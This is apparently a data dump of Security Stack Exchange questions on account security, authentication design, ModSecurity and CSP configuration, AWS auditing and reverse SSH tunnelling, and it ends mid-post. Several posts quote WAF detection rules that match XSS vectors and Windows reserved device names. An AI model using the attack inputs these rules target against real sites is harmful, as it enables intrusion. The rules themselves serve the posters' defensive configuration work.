"259158","1","","","2022-01-28 07:13:02","","1","75","<p>For our web application we are maintaining some data, pertaining to our subscribers, on our server.  Some of this data is sensitive and we would like to implement some &quot;security measures&quot; for this data.  One is encryption, and we know how to do that.  The other is non-repudiation of the content, and we don't know how to implement that.</p>
<p>Specifically we would like to handle the following use case.  On day X customer stores some data on our server.  On day Y they claim that the data was not stored by them (and implying that someone else stored the data).  How can we guard against that kind of repudiation challenge from a
customer?</p>
<p>Can we use some kind of hash or something?  Keep in mind that customers may occasionally forget their passwords, and passwords may have to be regenerated upon customer request.</p>
","273499","","37315","","2022-01-28 07:50:51","2022-03-02 10:27:50","Non-repudiation of customer data","<account-security><non-repudiation>","2","3","","","","CC BY-SA 4.0"
"187527","1","","","2018-06-11 09:16:08","","2","168","<p>I'm currently in internship in a software/app development company, where I have to come up with an idea about how can we handle the fact that the user will mostly use an app offline.</p>

<p>Basically, the app is a flight log, the first screen is a list of aircrafts. Once you click on an aircraft, you can then see the list of all flights belonging to this aircraft. The user will then be able to see every info on the flight, if there is a piece to change, anything unnatural etc...</p>

<p>I'm totally new to the security field of mobile apps (and I have only a bit of knowledge of security in general), so I've been reading a few questions/articles about this subject, but there is still some things I don't understand or I'm not sure about.</p>

<p>We're using CouchDB/PouchDB for the database, and I know that Bcrypt is used on the server-side (and the question left unanswered is: should we use it in client-side?)</p>

<p>So far I've came up with this idea: </p>

<ol>
<li><p>The user comes to his office on the morning, connects to the app
online, and his password is then hashed and stored on the server.</p></li>
<li><p>The user replicates his part* of the DB on the phone/tablet, along
    with his hashed password (+salt). the DB is encrypted with crypto-pouch</p></li>
<li>The user can now logout and go on the field, where he has no
    internet connection.</li>
<li>The user can login offline, access and modify his DB as he needs to
    for his work.</li>
<li><p>The user goes back to his office (or anywhere he has internet
    connection) and synchronises his tablet DB to the server one.</p>

<ul>
<li>: I'm saying ""his part of the DB"" because a specific user will only be able to work on a certain amount of aircraft/flights.</li>
</ul></li>
</ol>

<p>So here are my questions: </p>

<ul>
<li>Should I use two passwords? i.e one for online login on the server, and one for offline login? If so, what would be the strategy to adopt? </li>
<li>Where should I store the hashed password on the tablet? I'm hesitating between the local DB or the SessionStorage, but if I understood it well, if it's stored on the SessionStorage and the user logs out while offline, it would be deleted and therefore the user wouldn't be able to login again right?</li>
<li>Should I use Bcrypt on the client-side aswell and what does it imply?</li>
<li>Is the use of pepper really relevant? I can't seem to know if the
added security would be worth the implementation.</li>
<li>Globally, is this approach a good one for this kind of situation? If
not, why and what should I change?</li>
<li>I've read a few things about token, but as I understand it, it expires after a certain time, and right now I've not been told anything about how much time would the tablet be offline before getting back online, so I don't think it's the best option, am I right? </li>
</ul>

<p>I previsouly posted this question on <a href=""https://softwareengineering.stackexchange.com/questions/372399/strategy-regarding-an-almost-always-offline-app#372399"">software engineering</a>, but I've been told it would be better here.</p>

<p>Also, I have to protect the data in such case that the user is offline, logged out, and someone has managed to get physical access to the device.</p>

<p>Don't hesitate to tell me if you need more information, I may have forgotten something.</p>

<p>Any help would be greatly appreciated!</p>
","179754","","","","","2018-06-11 09:16:08","Strategy regarding an (almost always) offline app","<authentication><hash><account-security>","0","0","","","","CC BY-SA 4.0"
"187732","1","","","2018-06-14 00:28:44","","1","74","<p>I am developing a web application and want to do its setup and control using my personal notebook.</p>

<p>However, the following topics concern me:</p>

<p>1) Enter the platform (includes the login in the control panel of my application) that hosts my site.
* This platform does not have the option of 2-step verification.</p>

<p>2) Mozilla thunderbird webmail service.
* The webmail has been configured with ssl security.</p>

<p>Considering that I use a wi-fi modem, what risks are I subject to?
How to make this environment as safe as possible?</p>
","180211","","","","","2018-06-14 00:28:44","How to protect the control environment of my web application?","<web-application><wifi><content-security-policy><persona>","0","0","","2018-06-18 21:25:38","","CC BY-SA 4.0"
"187743","1","189906","","2018-06-14 03:12:31","","2","829","<p>ModSecurity blocked access due to the following:</p>

<blockquote>
  <p>[msg ""XSS Filter - Category 3: Javascript URI Vector""] [data ""Matched
  Data: esrco found within ARGS:as_email:hearsesesrcool@yahoo.com""]
  [severity ""CRITICAL""]</p>
</blockquote>

<p>Why does the string <code>esrco</code> trigger an error?  I tried googling any javascript implications and could not find any.  Should I disable this rule?</p>
","114795","","114795","","2018-06-14 23:18:08","2018-07-19 07:34:38","ModSecurity Rule 973338","<xss><javascript><apache><centos><mod-security>","1","3","","","","CC BY-SA 4.0"
"259481","1","","","2022-02-10 06:11:13","","0","241","<p>I'm trying to create a mobile app which helps to connect with my mobile app. While going through authentication I used JWT. While authenticating it, it returns access token and refresh token to the client but if both of them are sniffed so there can be a concept of account takeover. Though I'm using HTTPS the attacker might get the access token by intercepting the request with burp suite.</p>
<p>But the Access token is also passed through header in request. Is there any way to secure my access token before sending a request?</p>
","274113","","","","","2022-02-10 07:13:08","How to send JWT Access token with requests without being sniffed?","<account-security><jwt><python><client-side>","1","0","","","","CC BY-SA 4.0"
"121161","1","121162","","2016-04-21 16:31:55","","3","14628","<p>I thought Google Drive was more secure than this.</p>

<p>If I upload a photo to Google Drive, I don't care that it's entrusted to them and I also assume someone working there can look at it. No big deal. However, for the rest of the world, I assume my photo is safe short of someone getting my password and logging into my account.</p>

<p>I opened my image while in the network tab inspecting traffic and I found that the image pulls from a secondary location:</p>

<p><a href=""https://lh3.googleusercontent.com/zXJGmFXf9unQUTbiHYijvzlD1itVOsfRSKnO2GHc64D1s7HbAUl_T16qfTPiH8vJvjhoKA=w1886-h513"" rel=""nofollow"">https://lh3.googleusercontent.com/zXJGmFXf9unQUTbiHYijvzlD1itVOsfRSKnO2GHc64D1s7HbAUl_T16qfTPiH8vJvjhoKA=w1886-h513</a></p>

<p>This is an image shared with no one but myself on Google Drive. Anyone capable of inspecting network traffic can intercept that image by its googleusercontent address as it bypasses my login authority.</p>

<p>So, there's the public version of the private document hosted on googleusercontent.com, and there's the private version hosted on drive.google.com</p>

<p>Google Drive doesn't even seem like a reasonably secure option for my data, even though they claim ""Your files are private unless you choose to share them.""<br>
source: <a href=""https://support.google.com/drive/answer/141702?hl=en&amp;ref_topic=2428743"" rel=""nofollow"">Is Google Drive secure?</a></p>

<p>My files don't seem all that private from someone inspecting network traffic.</p>

<p>But, I must be missing something. What am I not understanding? I tried to find that address that exposes my image with Wireshark but got lost in details. How does a network snoop view the request generated to googleusercontent as I see it generated in my network tab in the browser when I open the 'private' photo in Google Drive?</p>
","66402","","","","","2016-04-21 20:52:37","Google Drive photo security and publicly visible lh*.googleusercontent.com","<google><url><sniffing><account-security>","1","3","","","","CC BY-SA 3.0"
"187817","1","191557","","2018-06-15 09:44:48","","2","621","<p>The goal here is to prevent identification of the users and their data. Is it a good idea to partition my database into multiple ones, one for each kind of sensitive data, hiding the links between them?</p>

<p>At first it seems that the answer is yes, because an attacker would need to gain access to all databases (potentially served from different servers/VMs/containers) in order to build the relationships between data and users, and identify them.</p>

<p>Of course doing so adds a lot of complexity to the application layer so I wonder if this is a good idea at all.</p>

<p><strong>EDIT:</strong> here is a more concrete example.</p>

<p>The project is a website. The application code runs on server A. Connections are done from the application to databases db1, db2 and db3, respectively on hosts B, C and D. No encryption at all (excepts passwords of course). The application code holds credentials for all three databases. So I do have a ""security bottleneck"" and it's server A. Besides, relationships between data are not stored in a separate database, but splitted in the three databases.</p>

<p><a href=""https://i.stack.imgur.com/lu5Ww.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lu5Ww.png"" alt=""enter image description here""></a></p>

<p>Is this bad design? Would I be better off setting up </p>

<ol>
<li>only one database (in server E) and strictly securing server A and E? or</li>
<li>another database to hold the links between data, to delay furthermore possible identification of users?</li>
</ol>

<p>Other solutions to consider?</p>

<p>Would any of this even be useful considering server A is a single point of failure / security bottleneck?</p>
","170153","","170153","","2018-06-15 11:42:31","2018-12-13 12:01:01","Partitioning database to enhance security/anonymity?","<attacks><databases><identification><security-by-design>","3","0","","","","CC BY-SA 4.0"
"46747","1","","","2013-12-10 07:03:00","","0","623","<p>For some reason I had been using public network for a small time, and I suspect that someone was actually watching/recording my online/offline activities.
At some time I suspected that someone was accessing my system (like cursor and other controls behaving weird as if someone else was controlling them, screen slightly blinking, etc).</p>

<p>Is there any way that we can find if someone is intruding on our system, or later search for any unethical access to the system?</p>
","27197","","9792","","2013-12-10 13:54:01","2013-12-10 13:54:01","Can we identify if someone is keeping an eye on our computer usage?","<intrusion><security-theater><snooping>","1","0","","","","CC BY-SA 3.0"
"188018","1","","","2018-06-19 08:54:09","","2","780","<p>After security scan, we are seeing the <a href=""https://cwe.mitre.org/data/definitions/693.html"" rel=""nofollow noreferrer"">Protection Mechanism Failure (CWE ID 693)</a> issue in our application.</p>

<p>Our current header is set as mentioned below-</p>

<pre><code>Server: Apache X-Frame-Options: SAMEORIGIN Accept-Ranges: bytes
Content-Length: 151 Last-Modified: Wed, 04 Apr 2018 08:18:16 GMT
X-Powered-By: Servlet/2.5 JSP/2.1 Content-Security-Policy: default-src
'self' 'unsafe-inline' 'unsafe-eval' *.googleapis.com www.google.com
*.google-analytics.com ; img-src 'self' data: ; Strict-Transport-Security: max-age=31536000; includeSubDomains;
preload X-XSS-Protection: 1; mode=block Content-Type: text/html
</code></pre>

<p>Can you please help to understand how the issue can be resolved? We tried nonce approach also but couldn't get succeed we are left with below issue</p>

<blockquote>
  <p>Refused to apply inline style because it violates the following
  Content Security Policy directive: ""style-src 'self'
  'nonce-1vb337j47ngp6'"". Either the 'unsafe-inline' keyword, a hash
  ('sha256-mf8m/qIWtvEARCPQ2lxzyNeJ+xiFw84zHgmCq5rxqbo='), or a nonce
  ('nonce-...') is required to enable inline execution.</p>
</blockquote>
","180507","","","user173641","2018-06-19 12:46:24","2018-06-19 12:46:24","""Protection Mechanism Failure (CWE ID 693)","<xss><content-security-policy>","0","0","","","","CC BY-SA 4.0"
"121480","1","","","2016-04-25 13:37:21","","2","1242","<p>This <a href=""https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual#TX"" rel=""nofollow"">page</a> describes definition of 'TX' as following:
""This is the transient transaction collection, which is used to store pieces of data, create a transaction anomaly score, and so on. The variables placed into this collection are available only until the transaction is complete.""</p>

<p>In modsecurity we also can frequently see another collection, 'tx', such as following rule:</p>

<p>SecRule </p>

<pre><code>REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* ""\bonmouseup\b\W*?\="" \
    ""phase:2, rev:'2', ver:'OWASP_CRS/2.2.9', maturity:'8', accuracy:'8', capture, t:none, t:htmlEntityDecode, t:compressWhiteSpace, t:lowercase, ctl:auditLogParts=+E, block, msg:'Cross-site Scripting (XSS) Attack', id:'958418', tag:'OWASP_CRS/WEB_ATTACK/XSS', tag:'WASCTC/WASC-8', tag:'WASCTC/WASC-22', tag:'OWASP_TOP_10/A2', tag:'OWASP_AppSensor/IE1', tag:'PCI/6.5.1', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', severity:'2', setvar:'tx.msg=%{rule.msg}', setvar:tx.xss_score=+%{tx.critical_anomaly_score}, setvar:tx.anomaly_score=+%{tx.critical_anomaly_score}, setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/XSS-%{matched_var_name}=%{tx.0}""
</code></pre>

<p>Why are there two similar collections used? Why no just using 'TX'?</p>
","51900","","6253","","2016-04-25 14:31:48","2022-10-03 22:38:23","What's the difference between 'TX' and 'tx' in modsecurity rule","<mod-security>","1","2","","","","CC BY-SA 3.0"
"47002","1","","","2013-12-15 08:44:04","","6","2366","<pre><code>PROBLEMRULE #1; SecRule REQUEST_URI ""^/(|(.*)/)(lpt1|lpt2|lpt3|lpt4)(/|\.|\?|$)"" ""t:none,t:htmlEntityDecode,t:lowercase,t:removeWhitespace,block,msg:'X',id:'1000'""
PROBLEMRULE #2; SecRule REQUEST_URI ""^(.*)//(.*)$"" ""t:none,t:removeWhitespace,block,msg:'X',id:'1001'""

// I also tried those, but no success.
SecRule REQUEST_URI ""//""
SecRule REQUEST_URI ""^/(.*)/(lpt1|lp...
</code></pre>

<p>These 2 things won't work as expected. Other rules are working fine.
I want to block a request something like:</p>

<pre><code>// (too many slash, NOT blocked)
/////////// (too many slash, NOT blocked)
/lpt1 (Apache returns 403, NOT from modsec. Error log: ""Forbidden: (web-dir)/lpt1 doesn't point to a file or directory"")
/lpt1/blah (Apache returns 403, NOT from modsec. ""doesn't point to a file or directory"")
/somedir/lpt4.txt (Same as above)
/somedir/lpt4 (Same as above)
/somedir/////// (* SUCCESSFULLY blocked)
</code></pre>

<p>I believe these regexpression is O.K., so I really want to know why mod_security2 won't block these requests. I want to block using mod_sec2, not apache.</p>

<p>Environment:
Windows Test Web server | mod_sec2 | Apache 2.4</p>

<pre><code>To moderators:
Sorry for creating another question,
because my email has been hacked and I lost my password.
Please delete http://security.stackexchange.com/questions/47000/why-these-2-regexp-wont-work-as-expected
I use THIS ONE to continue question.
</code></pre>

<p>To before question:</p>

<blockquote>
  <p>The REQUEST_URI variable doesn't include the domain or the protocol. Did you mean to add more to the end of that URL? </p>
</blockquote>

<p>Yes, I know.
I want mod_sec2 to deny ""GET ////////""(shown in above examples).
If I hit a browser hxxp: // something.mysite.com//////////
REQUEST_URI become ""///////"", so id:1001 should be applied. Am I right?</p>

<blockquote>
  <p>Is the rule ID logged for the request that is successfully blocked by Mod Security?</p>
</blockquote>

<p>If the mod_security rule was successfully applied, I can see mod_sec error in my
apache's errorlog(including hit ID number, of course.)</p>

<p>""/somedir/lpt4"" and other thing, are block <em>by</em> apache, not by mod_security.
(No logs from mod_security)</p>

<pre><code>LTP1?
</code></pre>

<p><a href=""http://www.hanselman.com/blog/NamingAFileAReservedNameInTheWindowsVistaOperatingSystem.aspx"">http://www.hanselman.com/blog/NamingAFileAReservedNameInTheWindowsVistaOperatingSystem.aspx</a>
I want mod_sec to deny these ugly internal commands, so I create a rule(id:1000).</p>

<p>P.S. ""RewriteRule"" is not an option to me. I want to use mod_sec2 to do this.</p>
","35710","","13768","","2013-12-17 19:20:20","2014-01-09 18:26:31","Why these 2 regexp won't work as expected in ModSecurity?","<apache><mod-security>","1","0","","","","CC BY-SA 3.0"
"47026","1","","","2013-12-15 17:10:19","","4","167","<p>Apologies if this in the wrong section, not sure if it should go in Server Fault or not.</p>

<p>I am preparing to launch a new web app. We have put a lot of effort into offering good security. From a PR perspective, I need to mention some of what we are doing - security is a fundamental part, and selling point, of this project and details will be expected.</p>

<p>So, my question is, how much do we give away without compromising our security. Do you bang on about fw/proxies, nids, hids, honeyd, compartmentalised architecture and watchdogs etc, or just ""we're PCI compliant"".</p>

<p>I should point out that a fair number of the users, especially early doors, will be security conscious and knowledgable; does being ""PCI Compiant"" cut it?</p>
","12230","","16228","","2013-12-15 17:56:00","2013-12-15 20:05:42","How much security information to publicise?","<pci-dss><security-theater>","2","0","","","","CC BY-SA 3.0"
"260028","1","","","2022-03-02 06:38:26","","0","72","<p>We previously had some AWS keys. The IAM interface show/showed no usage for it but the employee has been able to upload resources. Could anyone advise how to check if the interface is just erring or if they were perhaps not using these credentials?</p>
<p>The ATHENA Queries i was tried</p>
<pre><code>SELECT eventTime, eventName, userIdentity.principalId,eventSource
FROM athena-table
WHERE useridentity.accesskeyid like 'AKIAIOSFODNN7EXAMPLE'

SELECT *
FROM athena-table
WHERE useridentity.type = 'IAMUser'
AND useridentity.username LIKE 'Alice';
</code></pre>
<p>After investigating the credential report and when I dig into CloudTrail logs to find out when/where the key is being used I’m not getting so much help with the Last activity of user output</p>
<p>In the IAM Console, the Last activity is shown as Never for that particular user, but how is that user using the account without logging then. What is your best advice on it?</p>
<p>We'll be deleting that user but prior to doing that I wanted to see how she was using the account without logging in. Is there a better way to find out this?</p>
","275117","","275117","","2022-03-02 07:01:30","2022-03-02 07:01:30","AWS IAM Access Issue","<account-security><aws><user-tracking><devops>","0","5","","","","CC BY-SA 4.0"
"260078","1","260081","","2022-03-04 10:08:09","","39","7018","<p>In connection with recent events, I, as an ordinary citizen of Russia, wonder - can smartphone manufacturers (Google, Apple, Huawei, etc.) or any another (such as Microsoft, Cisco etc) remotely turn off my phone (or any another device)? I see questions like this have <a href=""https://security.stackexchange.com/questions/62326/how-can-the-nsa-remotely-turn-on-your-iphone"">been</a> <a href=""https://security.stackexchange.com/questions/59093/snowden-the-nsa-can-remotely-turn-on-your-iphone"">asked</a>, but they usually say &quot;remote enable&quot; and mine says otherwise.</p>
<p>Recently, there have been constant warnings on various forums that it is urgent to disable all updates on both desktop computers and mobile phones, saying that with the next update, all phones will turn into a pumpkin. As I understand it, this is more of an informational occasion to collect likes and views, but nevertheless the question remains serious - how much can manufacturers influence their customers and <strong>have there been similar precedents in world practice?</strong></p>
","249120","","","","","2022-03-06 20:17:12","Can the manufacturer remotely turn off my device?","<account-security>","8","3","","","","CC BY-SA 4.0"
"188359","1","","","2018-06-24 04:03:05","","0","106","<p>I have a Mac for my work laptop and I would like to work on my xCode project, I can't work on the laptop directly and save the file to computer due to fears that it could one day be recovered &amp; be property of the company, but would it be possible to work on my xCode project through a USB on my work computer without any files being recovered somehow?</p>
","180851","","","","","2018-06-24 11:11:30","Working from a USB","<privacy><account-security><usb><data-recovery><programming>","1","1","","2018-07-02 15:39:38","","CC BY-SA 4.0"
"260136","1","260137","","2022-03-07 09:00:55","","3","405","<p>I have a server (M: Main) that I trust very much (I have it home, locked, with an alarm, etc), to which I can SSH from the internet.</p>
<p>I also have a number of &quot;remote servers&quot; and &quot;IoT devices&quot; (O: Others) that I trust a bit less (because they are outside in the world, physically accessible to other people than me). &quot;In theory&quot;, they are safe (for example, at the home of a family member), but still I trust these a bit less.</p>
<p>I want to be able to SSH to the &quot;O&quot; devices from the internet. I do not want to set router port forwarding at the location of the &quot;O&quot; devices, this would be too much hazzle. So, the solution I consider is to set up a reverse ssh tunnel for each &quot;O&quot; device that forwards connections from some port of &quot;M&quot; to port 22 on the corresponding &quot;O&quot; device.</p>
<p>For this, I have to set up SSH keys on the &quot;O&quot; devices, to connect to some account on &quot;M&quot; to perform the <code>ssh -R</code> command. To enable automatic reboot in case of a problem, this SSH key needs to be usable by &quot;O&quot; out of the box, without me to enter any passphrase, ie the SSH must be available fully decrypted on &quot;O&quot;. So, I cannot really fully trust the &quot;O&quot; keys (they may get stolen or else), when used to log onto &quot;M&quot;, and I do not want people having access of these keys to be able to do anything on the &quot;M&quot; machine else than ssh port forwarding.</p>
<p>My question is, how to make this as well and secure as possible?</p>
<p>The solution I have found so far is to set up a very limited account on &quot;M&quot;, that only allows to perform the port forwarding. For this, I:</p>
<ul>
<li>create the user (user_r) on &quot;M&quot;, with user_r not being able to sudo</li>
<li>set up a SSH key to log to user_r, and disable password ssh login for &quot;M&quot;</li>
<li>change the default shell for &quot;M&quot; by editing <code>/etc/passwd</code> for user_r to <code>/usr/sbin/nologin</code></li>
</ul>
<p>From there on, it is possible to establish a SSH reverse tunnel that forward from &quot;M&quot; to &quot;O&quot;, by running on &quot;O&quot;:</p>
<p><code>ssh -NR M_PORT:localhost:22 user_r@M_IP_OR_DOMAIN</code></p>
<p>Dropping the <code>N</code>, or trying to &quot;ssh in a normal way&quot;, using user_r account on &quot;M&quot;, just returns immediately and says that the account is disabled, but using <code>-NR</code> still lets me set up the reverse tunnel.</p>
<p>My questions:</p>
<ul>
<li>is this secure?</li>
<li>is there a way to make this even more secure?</li>
<li>any flaws / possible improvements / better solution?</li>
</ul>
","163549","","163549","","2022-03-07 12:05:59","2022-03-07 12:05:59","How to set up a restricted account for reverse SSH port forwarding in a safe way?","<ssh><account-security><tunneling>","1","6","","","","CC BY-SA 4.0"
"260169","1","260202","","2022-03-08 20:15:28","","33","19980","<p>Basically the title. For example, how bad is it to store passwords in an Excel sheet protected with a password, instead of storing passwords in Keypass or something else like Zoho Vault? Of course, this sheet would be in a safe place as well: besides the password to open the sheet, an attacker would need the password to access the Google Drive account and a second factor authentication token from Google.</p>
","275370","","187134","","2022-03-10 02:56:43","2022-10-25 13:11:56","Is it safe to store account credentials in an Excel sheet protected with a password?","<passwords><password-management><account-security><excel>","6","7","","","","CC BY-SA 4.0"
"121832","1","121842","","2016-04-28 21:07:00","","1","150","<p>Essentially I have a application that is 2 parts.  </p>

<ol>
<li><p>One part is on the user's machine, which will upload files to my server, and </p></li>
<li><p>the other part is a web application that works with those files.</p></li>
</ol>

<hr>

<p>Both of the Applications implement security protocols for Authentication/Authorization on their own using the same security framework, but I'm not sure if they actually share any Session data (not sure how I would find that out).</p>

<hr>

<p>My question is.... if I added a WebView portion to the Main Application, would it be wise to make them log in again, since that's default functionality when going to the site?</p>

<p>Or, since they already logged in the main application, that there is no point in making them ""log in again?""</p>

<p>To add further into the discussion, the Main Application is more of an admin control area, where you create your users, so that others can log in to those users on the web.</p>

<p>IF I were to have 1 login for both, would it be weird logging into the admin (main) and then wanting to view a user would log in itself through the main Application and forcing a login?</p>

<p>I figured I would post both scenarios, in case one would be different.</p>

<hr>

<p>I assume that once you are in, it doesn't matter what happens.  The user accounts cannot be edited from the web, just the main application, so in reality once you are logged into the main, there isn't much you could do by auto-logging into the web part.</p>

<hr>

<p>I also am curious if I were to implement a password recovery for users, if it would make sense to allow changes to passwords in the application (without remembering the user password), or do a recovery process as if they were the admin.  AS I said above, once you're logged into the Admin, all users are vulnerable to anything.</p>

<hr>

<p>Thanks for any advice!</p>
","106817","","106817","","2016-04-28 21:12:24","2016-04-28 23:27:06","Is there an added benefit to authentication within a part of an application, after authenticated into the main application?","<authentication><web-application><authorization><client-side><account-security>","3","0","","","","CC BY-SA 3.0"
"188473","1","188483","","2018-06-26 08:27:06","","1","79","<p>I am connecting my computer located at my home to a remote server. </p>

<p>To communicate with the server, I use a config file that contains my private and public keys and a passphrase. My code reads the config file and sends a message containing the signature from the private key, the public key and the passphrase.</p>

<p>Now, I would like to run my code on the Cloud, for example AWS.
I suppose it is not safe to store the config file on AWS, so what would be the correct way to connect safely from AWS to the remote server ?</p>
","180967","","","","","2018-06-26 11:12:27","Safely connect to remote site from cloud based code","<key-management><account-security><cloud-computing>","1","0","","","","CC BY-SA 4.0"
"188477","1","","","2018-06-26 09:23:15","","5","769","<p>I've been going around a few threads / questions here but none of them actually talked about concrete implementation of two-man authorization methods. I've read reasonable amount of ideas and ""why""s but I am now looking for best ways to implement them.</p>

<p>To give you some context:
A and B works in the devOps / sytem admin team that manages the infrastructure for some company. They both decide that its a good idea to have two-man authentication where they both would have to perform some kind of authorization task in order to get / grant access.</p>

<p>I've read about several ways of doing this, for example:
1. Both admins have a part of the password which would work only when they key it in.
2. Token generation which would not reveal the actual secrets and would be destroyed after X hours of usage.</p>

<p>I want to implement this in case either one of us goes crazy and decides to wipe the systems. Any suggestions are appreciated. The use case would mostly be for AWS.</p>

<p>Thanks!</p>
","180974","","","","","2018-06-26 11:21:36","Dual - control (two man access) to AWS root logins?","<account-security><aws>","1","0","","","","CC BY-SA 4.0"
"188509","1","","","2018-06-26 15:58:12","","2","1426","<p>For a webshop, we allow customers to place an order either as a logged in user, or as a guest.</p>

<p>Guest checkout in itself is a quite common feature for webshops. The webshop in question is selling physical goods, so customers will still be required to fill in their name, email and address information. As such, a guest order is by no means an anonymous order.  </p>

<p><br><br>
Analysis of web traffic has shown that even if the customer has previously created an account, the may, for various reasons, not want to log in when they make a purchase. In these cases, the fact that they created an account on an earlier date, serves as a barrier to what they want to accomplish: place an order.</p>

<p><br>
Because we would like to minimize barriers (in order to optimise conversion), somebody suggested that we could allow guest-checkout for customers with an email address, even if the email address has previously been used to register an account. Registered accounts are bound to an email address. This registration functionality already supplies a would be attacker with an attack surface for email address enumeration.</p>

<p>In other words: even if an email address is bound to a registered customer, a customer should be allowed to checkout as a guest, with said email address, without logging in.<br>
Orders placed this way would be treated identical to any other guest order, whioh means that they would <em>not</em> be visible in the order history, etc. that is available for users that placed orders while logged in.</p>

<p><strong>So, my question is:</strong><br>
Would the above scenario open up any unexpected security implications?</p>
","2113","","2113","","2018-06-26 19:15:51","2018-06-26 19:15:51","What are the security implications of allowing guest checkout using an email bound to known account?","<account-security>","3","0","","","","CC BY-SA 4.0"
"260372","1","","","2022-03-15 10:12:36","","6","3125","<p>My friends Instagram account has repeatedly been hacked. Someone is gaining access to her account, proceeding to change all the security information to lock her out. Then posts scam ads on her account.</p>
<p>We have the full phone number and email address the hacker is using to change the info to. The country code has the number origin to Nigeria.</p>
<p>We've contacted Instagram 3 times now by sending a video of her proving her identity. Everytime Instagram has unlocked the account for her.</p>
<p>These are the things she's done everytime she's gotten back into the account, but the hacker has somehow regained access, <strong>including by somehow bypassing and deactivating 2FA without 2FA asking for confirmation</strong>!</p>
<ul>
<li>Change phone number back to hers (she has an iPhone)</li>
<li>Change the email address to a completely unrelated separate account.</li>
<li><strong>Added 2FA to her phone number, which the hacker is somehow getting back into the account without triggering a 2FA code to be sent to her phone - we have confirmed the 2FA was setup correctly as it asked her for a code when I attempted to login</strong></li>
<li>Manually logged out all other sessions on the Instagram account.</li>
<li>Changed password to a completely random string of characters (includes letters of varying case, numbers, and symbols)</li>
<li>Password of the old email account was also changed, before then completely changing the email address for the Instagram account.</li>
</ul>
<p>Somehow the attacker has regained access everytime and has locked my friend out. We're unsure how the attacker is still gaining access, especially with all the info changed (except the username and phone number) and 2FA being enabled. All info on the account gets replaced by the attacker, including 2FA being disabled (we also know that the attacker is also re-enabling 2FA on their device afterwards).</p>
<p>I remember reading years ago about how some attackers had gained access to intercept/receive all messages on someone's phone, thus allowing them to take control of their social media (I don't recall who, but I believe it was a famous tech figure such as Zuckerburg). Perhaps a little far-fetched here as there's nothing significant about the Instagram account (few hundred followers as it's a personal account). We have tried sending text messages to her phone number, both with iMessage enabled and disabled, and she received them. She also received the 2FA code triggered by me when I attempted to login to the account.</p>
<p>How can we regain access for the last time and securely lock down the account and perhaps lock down whatever route the attacker is using to get in and take control. We're really out of ideas now.</p>
","275680","","","","","2022-11-24 20:08:28","Friend's Instagram account repeatedly hacked despite changing all information and enabling 2FA","<attacks><account-security><system-compromise><account-lockout><instagram>","3","2","","","","CC BY-SA 4.0"
"121942","1","","","2016-04-29 19:25:47","","5","1075","<p>The <a href=""https://grsecurity.net/"" rel=""nofollow noreferrer"">grsecurity</a> folks <a href=""https://grsecurity.net/rap_announce.php"" rel=""nofollow noreferrer"">just released</a> a test patch for the 4.5 Linux kernel which includes <strike>Return Address</strike> Reuse Attack Protection or RAP, a protection technique against return-oriented programming (ROP).</p>

<p>Their <a href=""https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf"" rel=""nofollow noreferrer"">slides</a> are beyond comprehension for me at this point. Can somebody please explain, in layman's terms, how RAP works and how much protection it provides (is it probabilistic)?</p>

<p><strong>Edit:</strong> While the slides led me to believe that RAP stands for ""Return Address Protection"", Brad Spengler from from the grsecurity team confirmed that it actually for ""Reuse Attack Protection"" (as also confirmed by <a href=""https://security.stackexchange.com/a/121944/53680"">Polynomial's answer</a>).</p>
","53680","","-1","","2017-03-17 10:46:00","2016-04-30 16:23:47","How does reuse attack protection (RAP) work?","<attack-prevention><defense><anti-exploitation><grsecurity>","1","2","","","","CC BY-SA 3.0"
"260491","1","","","2022-03-19 05:11:09","","0","45","<p>Let's say there is a system that can set IP ACL for security.
If administrator can't bypass IP ACL, account may by locked up when machine or network IP changed
But if administrator can bypass IP ACL, then an attacker can bypass IP ACL when got administrator account. IP ACL gets meaningless.</p>
<p>Is there good way to mitigate both situations?</p>
","275843","","47524","","2022-03-19 21:07:57","2022-03-19 21:07:57","Should I let administrator account bypass IP ACL?","<account-security><ip><account-lockout>","0","2","","","","CC BY-SA 4.0"
"188799","1","188803","","2018-07-02 08:14:14","","1","319","<p>We have around 20+ accounts of different services (company email inboxes, forums, social media, Github, etc.) we use in my team. For security reasons, whenever some employee leaves us, I need to change the password for all those services. Luckily, it's happened twice in a three years span, but it's still a pain. </p>

<p>How do you deal with shared credentials when an employee leaves? Especially if you're in a large organization where people are coming and leaving on a monthly basis. Many of those services don't provide LDAP integration, so even if we disable their account, they still have access to the service.</p>
","","user15194","6253","","2018-07-02 08:45:16","2018-07-02 08:46:27","Dealing with shared credentials when an employee leaves","<account-security><credentials><user-management>","1","1","","","","CC BY-SA 4.0"
"260551","1","","","2022-03-21 19:00:36","","0","88","<p>Somestimes I press on my yubikey accidentally and it writes the token on the screen and even sends automatically to the person I'm talking to on some chat, because it presses enter. This happened several times to me, it weites something like xcvcvc....457 and sends.</p>
<p>My yubikey is, as far as I know, a 2FA on LastPass, so it cannot be used to log in by itself alone (how do I verify that?).</p>
<p>Anyways, suppose someone has my lastpass password and access to an old authentication token that I sent previously accidentally, but that I re-logged with a newer on on LastPass. Will this person be able to log in to my account? In other words, are these like a rolling code where the old ones get invalidated?</p>
<p>What if I have 3 yubikeys setted up in my LastPass as 2FA, and I accidentally send a code from yubikey 1, but log with yubikey 3? Will this invalidate yubikey 1's accidental token?</p>
","158391","","","","","2022-08-18 21:08:40","Will Lastpass ignore old 2FA tokens from the Yubikey? (tokens leaked accidentally)","<account-security><multi-factor><yubikey><lastpass>","1","0","","","","CC BY-SA 4.0"
"260640","1","260643","","2022-03-24 10:01:57","","0","198","<p>You create an account on an online service X with login=your email + password. Compare these 2 situations:</p>
<ul>
<li><p>No 2FA enabled. The only risk is if your email is compromised: the &quot;I lost my password&quot; feature can be used, and then the account on service X is also compromised.</p>
</li>
